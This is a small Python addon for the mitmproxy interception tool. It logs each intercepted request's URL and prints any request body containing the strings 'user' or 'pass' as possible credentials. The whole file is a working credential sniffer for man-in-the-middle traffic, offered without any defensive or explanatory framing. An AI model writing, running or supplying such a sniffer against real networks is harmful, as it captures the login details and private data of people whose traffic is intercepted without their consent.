from mitmproxy import http
from urllib.parse import urlparse

def has_keywords(data, keywords):
    return any(keyword in data for keyword in keywords)

def request(packet):
    url = packet.request.url
    parsed_url = urlparse(url)
    scheme = parsed_url.scheme
    domain = parsed_url.netloc
    path = parsed_url.path

    print(f"[+] URL: {scheme}://{domain}/{path}")

    keywords = ["user", "pass"]
    data = packet.request.get_text()
    if has_keywords(data, keywords):
        print(f"\n[+] Possible credentials found:\n\n{data}\n")